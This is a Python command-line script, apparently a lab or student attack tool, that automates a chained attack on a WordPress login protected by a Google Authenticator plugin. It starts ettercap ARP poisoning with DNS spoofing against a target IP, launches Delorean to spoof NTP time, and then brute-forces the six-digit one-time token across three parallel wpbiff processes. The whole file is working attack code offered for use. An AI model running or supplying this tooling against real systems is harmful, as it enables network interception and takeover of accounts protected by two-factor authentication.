#!/usr/bin/python
import shlex
import signal
import subprocess
import typer
from requests import Session
from rich.console import Console
from rich.progress import Progress
import pexpect
from datetime import datetime

from dependencies import checkErrors
from utility import is_valid_ip_address, get_timestamp, banner, is_pingable, handle_sigint

console = Console()
app = typer.Typer()
session = Session()
signal.signal(signal.SIGINT, handle_sigint)


def ettercap(timestamp, server, username, password):
    ip = input("Enter the IP address of the vulnerable server: ")
    # ip = "192.168.43.131"
    if not is_valid_ip_address(ip):
        console.log(f"[red bold]Error:[/red bold] IP address is not syntactically valid")
    elif not is_pingable(ip):
        console.log(f"[red bold]Error:[/red bold] IP address is unreachable")
    else:
        cmd = "sudo ettercap -T -M arp /" + ip + "// -P dns_spoof"
        console.print("Ettercap Starting...")
        p = pexpect.spawn(cmd, timeout=None)

        if not p.eof():
            console.print("Ettercap Started!", style="bold green")
            console.print("DNS Spoofing Starting...")

        while not p.eof():
            str_line = str(p.readline())
            if "UDP  " + ip + ":" in str_line:
                console.print("DNS Spoofing Started!", style="bold green")
                delorean(timestamp, server, username, password)
                break


def delorean(timestamp, server, username, password):
    console.print("Delorean Starting...")
    cmd = "python3 Delorean-master/delorean.py -d \"" + timestamp + "\""
    p = pexpect.spawn(cmd, timeout=None)

    if not p.eof():
        console.print("Delorean Started!", style="bold green")

    while not p.eof():
        str_line = str(p.readline())
        if "OSError: [Errno 98] Address already in use" in str_line:
            console.log("Error: Delorean already Started elsewhere!", style="bold red underline")
            break

        if "Sent to" in str_line:
            hour = (str_line[len(str_line) - 10: len(str_line) - 8])
            time = datetime.strptime(timestamp, '%Y-%m-%d %H:%M')
            time = time.replace(hour=int(hour))
            time = str(time.strftime('%Y-%m-%d %H:%M'))
            wpbiff(time, server, username, password)
            break


def wpbiff(timestamp, server, username, password):
    console.print("WP-biff Starting...")
    command_wp_biff1 = "sudo wpbiff -t 000000 -m 333333 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff2 = "sudo wpbiff -t 333333 -m 666666 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""
    command_wp_biff3 = "sudo wpbiff -t 666667 -m 999999 -u " + username + " -p " + password + " --plugin ga -d \"" + timestamp + "\" \"" + server + "\""

    p1 = subprocess.Popen(shlex.split(command_wp_biff1), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p2 = subprocess.Popen(shlex.split(command_wp_biff2), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p3 = subprocess.Popen(shlex.split(command_wp_biff3), stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    process = True
    total_cont = 0
    error = False
    with Progress() as progress:
        task = progress.add_task("[bold yellow]Discovering token...", total=999999)
        while process:
            output1 = p1.stderr.read1().strip().decode("utf8")
            output2 = p2.stderr.read1().strip().decode("utf8")
            output3 = p3.stderr.read1().strip().decode("utf8")

            if "Token: " in output1 and int(output1.split(" ")[1]) > 0 and int(output2.split(" ")[1]) > 333333 and int(
                    output3.split(" ")[1]) > 666666:
                cont1 = int(output1.split(" ")[1])
                cont2 = int(output2.split(" ")[1]) - 333333
                cont3 = int(output3.split(" ")[1]) - 666666

                current_advance = cont1 + cont2 + cont3 - total_cont
                progress.update(task_id=task, description="[bold yellow]Discovering token " + str(
                    cont1 + cont2 + cont3) + "/999999", advance=current_advance)
                total_cont = (cont1 + cont2 + cont3)

            if ("Traceback (most recent call last):" in output1 or p1.poll() is not None) and \
                    ("Traceback (most recent call last):" in output2 or p2.poll() is not None) and \
                    ("Traceback (most recent call last):" in output3 or p3.poll() is not None):
                process = False
                error = True

            if "100%" in output1:
                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
                print(p1.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                process = False

            if "100%" in output2:
                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
                print(p2.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                process = False

            if "100%" in output3:
                progress.update(task_id=task, description="[bold green]Token found", advance=999999)
                print(p3.stdout.read().strip().decode("utf8").split("Great Success!")[1])
                process = False

    if error:
        console.log(f"[red bold]WPbiff Error:[/red bold] Remote server did not respond. Is it down?")

    p1.terminate()
    p2.terminate()
    p3.terminate()


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable Wordpress server link"
        ),
        username: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress username"
        ),
        password: str = typer.Option(
            ...,
            prompt=True,
            help=f"WordPress password",
        ),
        dns_spoof: bool = typer.Option(
            default=True,
            prompt=True,
            help=f"DNS spoofing attack"
        )):
    banner()
    if checkErrors(server):
        # server = "http://192.168.43.131/wordpress/wp-login.php"
        # username = "admin"
        # password = "ubuntu"
        with console.status("Getting timestamp to use for the Attack"):
            timestamp = get_timestamp()
            console.print("The timestamp chosen for the attack is: " + timestamp,
                          style="bold dim cyan underline")
        if dns_spoof:
            ettercap(timestamp, server, username, password)
        else:
            delorean(timestamp, server, username, password)


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.log(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
